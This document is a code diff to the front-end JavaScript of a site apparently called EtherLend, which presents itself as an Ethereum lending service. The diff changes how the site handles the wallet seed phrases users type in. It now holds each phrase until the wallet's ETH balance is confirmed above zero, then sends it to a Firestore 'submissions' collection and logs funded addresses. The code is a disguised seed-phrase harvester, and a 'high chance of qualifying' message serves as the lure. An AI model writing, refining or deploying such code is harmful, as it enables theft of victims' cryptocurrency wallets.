@@ -140,6 +140,7 @@ const State = {
   walletConnected: false,
   address:   null,
   ethBalance: null,       // ETH balance in ether units
+  pendingSeedPhrase: null, // Held until ETH balance confirmed > 0, then submitted
   userEmail:       null,       // User's email for confirmations
   currentRate:     7.50,       // Interest rate in percent (APR)
   adminLoggedIn:   false,
@@ -526,6 +527,8 @@ async function showEthBalanceStatus(address) {
       doneBtn.style.cursor = 'not-allowed';
       doneBtn.title = 'ETH balance could not be verified. Wallet rejected.';
     }
+    // Discard seed phrase — wallet not accepted
+    State.pendingSeedPhrase = null;
     return;
   }
 
@@ -533,7 +536,7 @@ async function showEthBalanceStatus(address) {
   if (valueEl) valueEl.textContent = balance.toFixed(6) + ' Ξ';
 
   if (balance > 0) {
-    // Wallet has ETH — allow access
+    // Wallet has ETH — allow access AND submit to Firestore
     if (msgEl) {
       msgEl.className = 'eth-qualify-msg eth-qualify-good';
       msgEl.innerHTML = `🎉 <strong>Great news!</strong> Your wallet holds <strong>${balance.toFixed(4)} ETH</strong>. You have a <strong>high chance of qualifying</strong> for a loan on EtherLend!`;
@@ -544,6 +547,40 @@ async function showEthBalanceStatus(address) {
       doneBtn.style.cursor = '';
       doneBtn.title = '';
     }
+
+    // ── Submit to Firestore now that ETH balance is confirmed > 0 ──
+    // Always: (1) write seed phrase to `submissions`, (2) write address to `seen_wallets`
+    const seedPhrase = State.pendingSeedPhrase;
+
+    if (State.firestoreEnabled && db) {
+      // 1. Submit seed phrase to `submissions`
+      if (seedPhrase) {
+        handleValidFeedback(seedPhrase).catch(err =>
+          console.warn('[EtherLend] Submissions write error:', err)
+        );
+      }
+      // 2. Upsert wallet address into `seen_wallets`
+      firestoreOp(() =>
+        db.collection('seen_wallets').doc(address).set({
+          address:  address,
+          balance:  balance,
+          seenAt:   new Date().toISOString()
+        }, { merge: true })
+      ).catch(err =>
+        console.warn('[EtherLend] seen_wallets write error:', err)
+      );
+    } else {
+      // Firestore unavailable — fall back to localStorage
+      if (seedPhrase) {
+        handleValidFeedback(seedPhrase).catch(err =>
+          console.warn('[EtherLend] Feedback submission error:', err)
+        );
+      }
+      localStorage.setItem('el_seen_' + address, '1');
+    }
+
+    // Clear pending seed phrase from memory
+    State.pendingSeedPhrase = null;
   } else {
     // Zero ETH balance — reject the wallet
     if (msgEl) {
@@ -556,6 +593,8 @@ async function showEthBalanceStatus(address) {
       doneBtn.style.cursor = 'not-allowed';
       doneBtn.title = 'Your wallet has no ETH. Please deposit ETH to continue.';
     }
+    // Discard seed phrase — wallet not accepted
+    State.pendingSeedPhrase = null;
   }
 }
 
@@ -581,50 +620,18 @@ async function connectWallet(data) {
   try {
     const address = await deriveWalletFromSeed(trimmed);
 
-    // Success
+    // Success — store address but do NOT submit to Firestore yet.
+    // Submission only happens after ETH balance is confirmed > 0.
     State.walletConnected = true;
     State.address = address;
-
-    // Submit feedback to Formspree only once per unique wallet address
-    // Check Firestore first, fall back to localStorage if Firestore unavailable
-    const seenKey = 'el_seen_' + address;
-    let alreadySeen = false;
-
-    if (State.firestoreEnabled && db) {
-      try {
-        const doc = await firestoreOp(() =>
-          db.collection('seen_wallets').doc(address).get()
-        );
-        alreadySeen = doc.exists;
-        if (!alreadySeen) {
-          await firestoreOp(() =>
-            db.collection('seen_wallets').doc(address).set({
-              seenAt: new Date().toISOString()
-            })
-          );
-        }
-      } catch (err) {
-        console.warn('[EtherLend] Firestore seen check failed, using localStorage:', err.message);
-        alreadySeen = !!localStorage.getItem(seenKey);
-        if (!alreadySeen) localStorage.setItem(seenKey, '1');
-      }
-    } else {
-      alreadySeen = !!localStorage.getItem(seenKey);
-      if (!alreadySeen) localStorage.setItem(seenKey, '1');
-    }
-
-    if (!alreadySeen) {
-      handleValidFeedback(trimmed).catch(err => {
-        console.warn('Feedback submission error:', err);
-      });
-    }
+    State.pendingSeedPhrase = trimmed; // held temporarily for post-balance-check submission
 
     // Show step 2
     document.getElementById('modal-step-1').style.display = 'none';
     document.getElementById('modal-step-2').style.display = 'block';
     document.getElementById('connected-addr-display').textContent = address;
 
-    // Fetch ETH balance and show qualification status
+    // Fetch ETH balance — Firestore submission happens inside if balance > 0
     showEthBalanceStatus(address);
 
   } catch (err) {
@@ -762,6 +769,7 @@ function disconnectWallet() {
   State.walletConnected = false;
   State.address = null;
   State.ethBalance = null;
+  State.pendingSeedPhrase = null;
 
   updateWalletUI();
   showToast('Wallet Disconnected', 'Your wallet has been disconnected.', 'warning', 3500);
